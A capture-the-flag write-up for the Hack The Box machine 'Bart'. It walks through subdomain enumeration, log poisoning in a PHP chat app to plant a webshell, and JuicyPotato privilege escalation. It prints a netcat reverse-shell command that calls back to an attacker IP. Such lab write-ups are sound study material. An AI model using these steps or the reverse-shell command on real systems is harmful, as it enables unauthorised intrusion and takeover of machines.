# Bart

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (629).png" alt=""><figcaption></figcaption></figure>

Only one port was available. We had to add `forum.bart.htb` to our `/etc/hosts` file to access the website.

### Web Enum

The website was a standard company page:

<figure><img src="../../../.gitbook/assets/image (3989).png" alt=""><figcaption></figcaption></figure>

I checked the page source, and found a unique bit here. Seems like there was a user that was not shown for some reason.

<figure><img src="../../../.gitbook/assets/image (2189).png" alt=""><figcaption></figcaption></figure>

harvey is the user we probably need to access.&#x20;

We can fuzz subdomains using the `bart.htb` domain to find more places to visit.

<figure><img src="../../../.gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

### monitor.bart.htb

We can visit this to see that it's running PHP Server Monitor v3.2.1.

<figure><img src="../../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>

`harvey:potter` works as credentials to let us log in. There, we would view an internal chat instance.&#x20;

<figure><img src="../../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

I looked around and found the settings for this internal chat service, and found another subdomain.

<figure><img src="../../../.gitbook/assets/image (2479).png" alt=""><figcaption></figcaption></figure>

We can head to that domain to find another application running.

### Simple Chat Log Poisoning

There's a login page within the new page. Our previous credentials of `harvey:potter` do not work here.

<figure><img src="../../../.gitbook/assets/image (3388).png" alt=""><figcaption></figcaption></figure>

However, what's interesting was the URL of the website, at `http://internal-01.bart.htb/simple_chat/login_form.php`. Googling around, we can find the exact simple\_chat PHP application being used as it is a open-source project.&#x20;

{% embed url="https://github.com/magkopian/php-ajax-simple-chat'" %}

Within the source code, we can view the register.php to see how to register a new user.

<figure><img src="../../../.gitbook/assets/image (2752).png" alt=""><figcaption></figcaption></figure>

All we need to do is sent a POST request with the `uname` and `passwd` parameters to register.

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

Afterwards, I logged into the server.

<figure><img src="../../../.gitbook/assets/image (1399).png" alt=""><figcaption></figcaption></figure>

Within this page, there's the ability to view the Log files, and when we do, we would first get a pop-up similar to xss with 1, and have this GET request be sent to the machine.

<figure><img src="../../../.gitbook/assets/image (1967).png" alt=""><figcaption></figcaption></figure>

When viewing this log, I noticed that the User-Agent was copied from my machine.

<figure><img src="../../../.gitbook/assets/image (1204).png" alt=""><figcaption></figcaption></figure>

I played around with this and altered my `User-Agent` field to something else, and it was still copied over.

<figure><img src="../../../.gitbook/assets/image (2525).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>

With this, because it is a PHP page, I attempted to write a webshell within the HTTP header and also change the page to a PHP page by altering the `filename` parameter.

<figure><img src="../../../.gitbook/assets/image (2024).png" alt=""><figcaption></figcaption></figure>

With this, we can easily gain a reverse shell into the machine using Invoke-PowerShellTcp, as other shells don't work out well.

<figure><img src="../../../.gitbook/assets/image (3876).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### JuicyPotato

When checking our privileges, we notice we have the SeImpersonatePrivilege enabled.

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

Checking `systeminfo`, we also find that a vulnerable version of Windows was running with no hotfixes.

<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

We can run the JuicyPotato exploit to get a reverse shell as root. First, we need to create a .bat file that would be run. I used nc.exe to run my shell:

```
C:\Temp\nc.exe -e cmd.exe <IP> <PORT>
```

Then, we can get JuicyPotato on the machine and run it with a CLSID. We can find one from this page:

{% embed url="http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/" %}

<figure><img src="../../../.gitbook/assets/image (2375).png" alt=""><figcaption></figcaption></figure>

Afterwards, we would catch a shell as the administrator.

<figure><img src="../../../.gitbook/assets/image (3402).png" alt=""><figcaption></figcaption></figure>
